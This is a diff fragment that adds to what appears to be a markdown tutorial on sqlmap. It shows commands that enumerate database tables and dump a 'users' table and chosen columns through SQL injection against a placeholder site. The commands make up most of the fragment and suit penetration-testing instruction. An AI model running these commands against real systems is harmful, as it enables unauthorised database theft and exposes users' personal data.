@@ -78,4 +78,16 @@ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --
 
 Table Enumeration:
 
-After knowing what current DB we are in, we can enumerate tables we have by using 
+After knowing what current DB we are in, we can enumerate tables we have by using --tables
+```
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+```
+
+After knowing what table we have, we can dump it with --dump option and specify table name with -T
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+```
+We can also specify the only column to dump with -C option:
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+```
